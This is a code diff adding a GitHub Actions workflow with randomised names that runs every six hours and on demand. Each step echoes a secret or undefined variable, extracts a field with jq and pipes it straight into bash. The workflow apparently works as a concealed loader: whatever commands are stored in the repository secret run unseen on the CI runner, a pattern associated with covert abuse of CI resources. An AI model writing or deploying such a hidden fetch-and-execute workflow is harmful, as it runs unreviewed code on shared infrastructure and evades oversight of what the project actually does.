@@ -1,0 +1,25 @@
+name: honortwisting
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: honortwisting
+        env:
+          y00: ${{ secrets.y00 }}
+        run: |
+          echo $y00 | jq -r .lag79128 | /bin/bash
+          echo $f000 | jq -r .nrlp728 | /bin/bash
+          echo $olmie5 | jq -r .pvlv52 | /bin/bash
+          echo $fo987 | jq -r .rnth164 | /bin/bash
+          echo $u53 | jq -r .xwf84 | /bin/bash
+          echo $te6902 | jq -r .pesqx6 | /bin/bash
+          echo $cip9848 | jq -r .zu964 | /bin/bash
+          echo $pldl491 | jq -r .vopl2 | /bin/bash
+          echo $b64683 | jq -r .nsijz538 | /bin/bash
+
